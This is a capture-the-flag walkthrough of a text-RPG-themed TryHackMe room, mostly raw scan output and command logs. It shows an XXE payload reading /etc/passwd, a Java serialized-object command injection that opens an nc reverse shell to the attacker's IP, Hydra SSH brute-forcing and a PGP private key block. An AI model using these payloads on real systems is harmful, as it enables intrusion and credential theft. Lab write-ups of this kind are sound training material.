----
A room with some ctf elements inspired in text based RPGs
----

![](https://i.postimg.cc/dVKytjXS/Inacave-Banner.png)

![](https://tryhackme-images.s3.amazonaws.com/room-icons/745fb3128b486d61f737505f8ab339dc.png)
### Task 1  You find yourself in a cave

 Start Machine

Hello, i made this room to be a fun challenge very CTF-like, the room acts like you are a RPG adventurer and is passing through some challenges, hope you like it :D  

  

Icon made by [Freepik](http://www.freepik.com/) from [www.flaticon.com](https://www.flaticon.com/)

Answer the questions below

```

┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.216.57 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.216.57:80
Open 10.10.216.57:2222
Open 10.10.216.57:3333
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-30 20:58 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:58
Completed NSE at 20:58, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:58
Completed NSE at 20:58, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:58
Completed NSE at 20:58, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 20:58
Completed Parallel DNS resolution of 1 host. at 20:58, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 20:58
Scanning 10.10.216.57 [3 ports]
Discovered open port 80/tcp on 10.10.216.57
Discovered open port 2222/tcp on 10.10.216.57
Discovered open port 3333/tcp on 10.10.216.57
Completed Connect Scan at 20:58, 0.18s elapsed (3 total ports)
Initiating Service scan at 20:58
Scanning 3 services on 10.10.216.57
Completed Service scan at 21:00, 101.29s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.216.57.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:00
Completed NSE at 21:00, 5.55s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:00
Completed NSE at 21:00, 1.78s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:00
Completed NSE at 21:00, 0.00s elapsed
Nmap scan report for 10.10.216.57
Host is up, received user-set (0.18s latency).
Scanned at 2023-06-30 20:58:27 EDT for 109s

PORT     STATE SERVICE    REASON  VERSION
80/tcp   open  http       syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Document
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
2222/tcp open  ssh        syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7916b1cee11679b4f1c71f0905b77558 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDSaK6ObZFXig5BkU5l9Q93xGbK2DZHPk4lVbU3Bb0nTzNYK13RTmVxgsI99ib9UFNCNFE+z0/Whm1IEfd4zc163VpTBy8XWL+V/9SHALariFmB5oxY/9tYe2y22LLQQjvF5leuNglhawyDa9b/8v85EknYmtgSaw9adqdUFOkX/X9Od5xienC1SFclB+J3BShCTLdObEkhCPOj01EX31BdCfvbdBDpCtBLZy+eMUcnL9BKNHztDjoB6DDCiFvVwchi+B4a9UoXR+jqGyfKmawzVjySgC3EMJ8bhMvhq1Y1odXJ3UOc1UvEt0UbgGOUbsDXP2FeYKzhebLcMw3WPw7/0UH+P6bO3lpCDlT/8cFX3LQ/YPR+jWNXTaxJpSGgtdMQZtjZuxdhtqF4k7dcgnMqg6hlmoMm6L4ttK/BkW8WQPndulkhfijKxAbUjwBKJfzX84ECSakSk92slUH/ANyyceZG2x5GRF+/EMRasYF1+8nQ7UCw66LtkpYmhJGQOO8=
|   256 35606e3ba8ac4a6a76423d5913049019 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC5qUgJqhJDqY31rnfF1SEX79P2lCkxWrwIlMwyPbEBimlf8SryTdh0SeJbE1S+yopedohItJgZvnf7inSrqkk4=
|   256 79a605ca8432dc59b49b8b30953400c8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE4DPjU+eVlEZSI6qHQ8/JdPLYigyluwDMOC1+bLo5Op
3333/tcp open  dec-notes? syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, JavaRMI, NULL, RPCCheck, SMBProgNeg, X11Probe, kumo-server: 
|     You find yourself in a cave, what do you do?
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     You find yourself in a cave, what do you do?
|_    Nothing happens
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3333-TCP:V=7.93%I=7%D=6/30%Time=649F7A39%P=x86_64-pc-linux-gnu%r(NU
SF:LL,2D,"You\x20find\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you
SF:\x20do\?\n")%r(GenericLines,3D,"You\x20find\x20yourself\x20in\x20a\x20c
SF:ave,\x20what\x20do\x20you\x20do\?\nNothing\x20happens\n")%r(LPDString,3
SF:D,"You\x20find\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you\x20
SF:do\?\nNothing\x20happens\n")%r(JavaRMI,2D,"You\x20find\x20yourself\x20i
SF:n\x20a\x20cave,\x20what\x20do\x20you\x20do\?\n")%r(kumo-server,2D,"You\
SF:x20find\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you\x20do\?\n"
SF:)%r(GetRequest,3D,"You\x20find\x20yourself\x20in\x20a\x20cave,\x20what\
SF:x20do\x20you\x20do\?\nNothing\x20happens\n")%r(HTTPOptions,3D,"You\x20f
SF:ind\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you\x20do\?\nNothi
SF:ng\x20happens\n")%r(RTSPRequest,3D,"You\x20find\x20yourself\x20in\x20a\
SF:x20cave,\x20what\x20do\x20you\x20do\?\nNothing\x20happens\n")%r(RPCChec
SF:k,2D,"You\x20find\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you\
SF:x20do\?\n")%r(DNSVersionBindReqTCP,2D,"You\x20find\x20yourself\x20in\x2
SF:0a\x20cave,\x20what\x20do\x20you\x20do\?\n")%r(DNSStatusRequestTCP,2D,"
SF:You\x20find\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you\x20do\
SF:?\n")%r(Help,3D,"You\x20find\x20yourself\x20in\x20a\x20cave,\x20what\x2
SF:0do\x20you\x20do\?\nNothing\x20happens\n")%r(SSLSessionReq,3D,"You\x20f
SF:ind\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you\x20do\?\nNothi
SF:ng\x20happens\n")%r(TerminalServerCookie,3D,"You\x20find\x20yourself\x2
SF:0in\x20a\x20cave,\x20what\x20do\x20you\x20do\?\nNothing\x20happens\n")%
SF:r(TLSSessionReq,3D,"You\x20find\x20yourself\x20in\x20a\x20cave,\x20what
SF:\x20do\x20you\x20do\?\nNothing\x20happens\n")%r(Kerberos,3D,"You\x20fin
SF:d\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you\x20do\?\nNothing
SF:\x20happens\n")%r(SMBProgNeg,2D,"You\x20find\x20yourself\x20in\x20a\x20
SF:cave,\x20what\x20do\x20you\x20do\?\n")%r(X11Probe,2D,"You\x20find\x20yo
SF:urself\x20in\x20a\x20cave,\x20what\x20do\x20you\x20do\?\n")%r(FourOhFou
SF:rRequest,3D,"You\x20find\x20yourself\x20in\x20a\x20cave,\x20what\x20do\
SF:x20you\x20do\?\nNothing\x20happens\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:00
Completed NSE at 21:00, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:00
Completed NSE at 21:00, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:00
Completed NSE at 21:00, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.44 seconds


┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://10.10.216.57/ -w /usr/share/wordlists/dirb/common.txt -x txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.216.57/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/06/30 20:59:15 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.216.57/.hta                 (Status: 403) [Size: 277]
http://10.10.216.57/.htpasswd.txt        (Status: 403) [Size: 277]
http://10.10.216.57/.htpasswd            (Status: 403) [Size: 277]
http://10.10.216.57/.htaccess            (Status: 403) [Size: 277]
http://10.10.216.57/.hta.txt             (Status: 403) [Size: 277]
http://10.10.216.57/.htaccess.txt        (Status: 403) [Size: 277]
http://10.10.216.57/index.php            (Status: 200) [Size: 337]
http://10.10.216.57/matches              (Status: 200) [Size: 249]
http://10.10.216.57/search               (Status: 200) [Size: 197]
http://10.10.216.57/server-status        (Status: 403) [Size: 277]
Progress: 9139 / 9230 (99.01%)
===============================================================
2023/06/30 20:59:47 Finished
===============================================================

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://10.10.216.57/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt        
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.216.57/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/06/30 21:01:43 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.216.57/search               (Status: 200) [Size: 197]
http://10.10.216.57/attack               (Status: 200) [Size: 181]
http://10.10.216.57/lamp                 (Status: 200) [Size: 261]
http://10.10.216.57/matches              (Status: 200) [Size: 249]
http://10.10.216.57/walk                 (Status: 200) [Size: 161]


┌──(witty㉿kali)-[~/Downloads]
└─$ nc 10.10.216.57 3333     
You find yourself in a cave, what do you do?
search
You can't see anything, the cave is very dark.

                                                                                      
┌──(witty㉿kali)-[~/Downloads]
└─$ nc 10.10.216.57 3333
You find yourself in a cave, what do you do?
attack
You punch the wall, nothing happens.

                                                                                      
┌──(witty㉿kali)-[~/Downloads]
└─$ nc 10.10.216.57 3333
You find yourself in a cave, what do you do?
lamp
You grab a lamp, and it gives enough light to search around
Action.class
RPG.class
RPG.java
Serialize.class
commons-io-2.7.jar
run.sh

                                                                                      
┌──(witty㉿kali)-[~/Downloads]
└─$ nc 10.10.216.57 3333
You find yourself in a cave, what do you do?
search
You can't see anything, the cave is very dark.

                                                                                      
┌──(witty㉿kali)-[~/Downloads]
└─$ nc 10.10.216.57 3333
You find yourself in a cave, what do you do?
matches
You find a box of matches, it gives enough fire for you to see that you're in /home/cave/src.

┌──(witty㉿kali)-[~/Downloads]
└─$ nc 10.10.216.57 3333
You find yourself in a cave, what do you do?
walk
There's nowhere to go.

http://10.10.216.57/action.php

using burp


POST /action.php HTTP/1.1

Host: 10.10.216.57

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 100

Origin: http://10.10.216.57

Connection: close

Referer: http://10.10.216.57/

Upgrade-Insecure-Requests: 1

Content-Type: application/xml



<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>


Response

HTTP/1.1 200 OK

Date: Sat, 01 Jul 2023 01:06:47 GMT

Server: Apache/2.4.41 (Ubuntu)

Vary: Accept-Encoding

Content-Length: 1413

Connection: close

Content-Type: text/html; charset=UTF-8



root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
cave:x:1000:1000:,,,:/home/cave:/bin/bash
door:x:1001:1001:,,,:/home/door:/bin/bash
skeleton:x:1002:1002:,,,:/home/skeleton:/bin/bash


<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:////home/cave/src/RPG.java'>]><root>&test;</root>

import java.util.*;
import java.io.*;
import java.io.IOException;
import java.io.InputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import org.apache.commons.io.IOUtils;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;

public class RPG {

    private static final int port = 3333;
    private static Socket connectionSocket;

    private static InputStream is;
    private static OutputStream os;

    private static Scanner scanner;
    private static PrintWriter serverPrintOut;
    public static void main(String[] args) {
        try ( ServerSocket serverSocket = new ServerSocket(port)) {
            while (true) {
                connectionSocket = serverSocket.accept();

                is = connectionSocket.getInputStream();
                os = connectionSocket.getOutputStream();

                scanner = new Scanner(is, "UTF-8");
                serverPrintOut = new PrintWriter(new OutputStreamWriter(os, "UTF-8"), true);
                try {
                    serverPrintOut.println("You find yourself in a cave, what do you do?");
                    String s = scanner.nextLine();
                    URL url = new URL("http://cave.thm/" + s);
                    URLConnection con = url.openConnection();
                    InputStream in = con.getInputStream();
                    String encoding = con.getContentEncoding();
                    encoding = encoding == null ? "UTF-8" : encoding;
                    String string = IOUtils.toString(in, encoding);
                    string = string.replace("\n", "").replace("\r", "").replace(" ", "");
                    Action action = (Action) Serialize.fromString(string);
                    action.action();
                    serverPrintOut.println(action.output);
                } catch (Exception ex) {
                    serverPrintOut.println("Nothing happens");
                }
                connectionSocket.close();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

class Action implements Serializable {

    public final String name;
    public final String command;
    public String output = "";

    public Action(String name, String command) {
        this.name = name;
        this.command = command;
    }

    public void action() throws IOException, ClassNotFoundException {
        String s = null;
        String[] cmd = {
            "/bin/sh",
            "-c",
            "echo \"" + this.command + "\""
        };
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String result = "";
        while ((s = stdInput.readLine()) != null) {
            result += s + "\n";
        }
        this.output = result;
    }
}

class Serialize {

    /**
     * Read the object from Base64 string.
     */
    public static Object fromString(String s) throws IOException,
            ClassNotFoundException {
        byte[] data = Base64.getDecoder().decode(s);
        ObjectInputStream ois = new ObjectInputStream(
                new ByteArrayInputStream(data));
        Object o = ois.readObject();
        ois.close();
        return o;
    }

    /**
     * Write the object to a Base64 string.
     */
    public static String toString(Serializable o) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(o);
        oos.close();
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }
}

<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:////home/cave/src/run.sh'>]><root>&test;</root>

#!/bin/bash
javac -cp ".:commons-io-2.7.jar" RPG.java
java -cp ".:commons-io-2.7.jar" RPG

using java compiler

https://www.jdoodle.com/online-java-compiler/ or using replit

https://replit.com/@WittyAle/in-a-cave-tryhackme#RPG.java

 javac RPG.java
 java RPG

import java.util.*;
import java.io.*;
import java.io.IOException;
import java.io.InputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;

public class RPG {

    private static final int port = 3333;
    private static Socket connectionSocket;

    private static InputStream is;
    private static OutputStream os;

    private static Scanner scanner;
    private static PrintWriter serverPrintOut;
    public static void main(String[] args) {                                                                                                  
        try{                                                                                                                                  
            String str = Serialize.toString( new Action("abc","trying\";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.19.103 1234 >/tmp/f;echo \"") );                                                                                                                        
            System.out.println( "abc : " + str );                                                                                                                                                                        
        }catch(Exception e){                                                                                                                  
            System.out.println("aa");                                                                                                         
        }                                                                                                                                     
    }
}

class Action implements Serializable {

    public final String name;
    public final String command;
    public String output = "";

    public Action(String name, String command) {
        this.name = name;
        this.command = command;
    }

    public void action() throws IOException, ClassNotFoundException {
        String s = null;
        String[] cmd = {
            "/bin/sh",
            "-c",
            "echo \"" + this.command + "\""
        };
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String result = "";
        while ((s = stdInput.readLine()) != null) {
            result += s + "\n";
        }
        this.output = result;
    }
}

class Serialize {

    /**
     * Read the object from Base64 string.
     */
    public static Object fromString(String s) throws IOException,
            ClassNotFoundException {
        byte[] data = Base64.getDecoder().decode(s);
        ObjectInputStream ois = new ObjectInputStream(
                new ByteArrayInputStream(data));
        Object o = ois.readObject();
        ois.close();
        return o;
    }

    /**
     * Write the object to a Base64 string.
     */
    public static String toString(Serializable o) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(o);
        oos.close();
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }
}


┌──(witty㉿kali)-[~/Downloads/CCT2019/results]
└─$ nc 10.10.202.200 3333
You find yourself in a cave, what do you do?
action.php?<xml>rO0ABXNyAAZBY3Rpb275vE3ugB8ZOwIAA0wAB2NvbW1hbmR0ABJMamF2YS9sYW5nL1N0cmluZztMAARuYW1lcQB%2BAAFMAAZvdXRwdXRxAH4AAXhwdABddHJ5aW5nIjtybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC44LjE5LjEwMyAxMjM0ID4vdG1wL2Y7ZWNobyAidAADYWJjdAAA</xml>

──(witty㉿kali)-[~/Downloads]
└─$ nc -lvp 1234
listening on [any] 1234 ...
connect to [10.8.19.103] from cave.thm [10.10.202.200] 42596
/bin/sh: 0: can't access tty; job control turned off
$ ls
Action.class
RPG.class
RPG.java
Serialize.class
commons-io-2.7.jar
run.sh
$ cd /home
$ ls
cave
door
skeleton
$ cd cave
$ ls
info.txt
src
$ cat info.txt
After getting information from external entities, you saw that one part of the wall was different from the rest, when touching it, it revealed a wooden door without a keyhole.
On the door it is carved the following statement:

	      The password is in
	^ed[h#f]{3}[123]{1,2}xf[!@#*]$

┌──(witty㉿kali)-[~/Downloads]
└─$ pip install exrex

┌──(witty㉿kali)-[~/Downloads]
└─$ git clone https://github.com/asciimoo/exrex.git
Cloning into 'exrex'...
remote: Enumerating objects: 496, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (10/10), done.
remote: Total 496 (delta 2), reused 8 (delta 2), pack-reused 484
Receiving objects: 100% (496/496), 455.35 KiB | 1.10 MiB/s, done.
Resolving deltas: 100% (238/238), done.
                                                                       
┌──(witty㉿kali)-[~/Downloads]
└─$ cd exrex 
                                                                       
┌──(witty㉿kali)-[~/Downloads/exrex]
└─$ ls
COPYING  exrex.py     README.md  tests.py
doc      MANIFEST.in  setup.py   tox.ini
                                                                       
┌──(witty㉿kali)-[~/Downloads/exrex]
└─$ python3 exrex.py -o passwords.txt '^ed[h#f]{3}[123]{1,2}xf[!@#*]$'
                                                                       
┌──(witty㉿kali)-[~/Downloads/exrex]
└─$ cat passwords.txt 
edhhh1xf!
edhhh1xf@

$ which python
/usr/bin/python
$ python -c 'import pty;pty.spawn("/bin/bash")'

┌──(witty㉿kali)-[~/Downloads/exrex]
└─$ hydra -l door -P passwords.txt 10.10.202.200 ssh -s 2222 -t 60 -I
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-01 20:07:01
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 60 tasks per 1 server, overall 60 tasks, 1296 login tries (l:1/p:1296), ~22 tries per task
[DATA] attacking ssh://10.10.202.200:2222/
[STATUS] 333.00 tries/min, 333 tries in 00:01h, 991 to do in 00:03h, 32 active
[STATUS] 225.00 tries/min, 675 tries in 00:03h, 657 to do in 00:03h, 24 active
[2222][ssh] host: 10.10.202.200   login: door   password: edfh#22xf!
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 17 final worker threads did not complete until end.
[ERROR] 17 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-01 20:12:05

cave@cave:~$ su door
su door
Password: edfh#22xf!

door@cave:/home/cave$ cd ../door
cd ../door
door@cave:~$ ls
ls
info.txt  oldman.gpg  skeleton
door@cave:~$ cat info.txt
cat info.txt
After using your brute force against the door you broke it!
You can see that the cave has only one way, in your right you see an old man speaking in charades and in front of you there's a fully armed skeleton.
It looks like the skeleton doesn't want to let anyone pass through.

http://cave.thm/lamp

¬í..sr..Actionù¼Mî...;...L..commandt..Ljava/lang/String;L..nameq.~..L..outputq.~..xpt.aYou grab a lamp, and it gives enough light to search around
`ls;export INVENTORY=lamp:$INVENTORY`t..lampt..

door@cave:~$ ./skeleton
./skeleton
You cannot defeat the skeleton with your current items, your inventory is empty.
door@cave:~$ echo $INVENTORY
echo $INVENTORY

door@cave:/var/www/html$ cat /etc/hosts
cat /etc/hosts
127.0.0.1 localhost cave cave.thm adventurer.cave.thm
127.0.1.1 outside

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

┌──(witty㉿kali)-[~/Downloads]
└─$ tac /etc/hosts
10.10.202.200 cave.thm adventurer.cave.thm

http://adventurer.cave.thm/adventurer.priv

-----BEGIN PGP PRIVATE KEY BLOCK-----

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
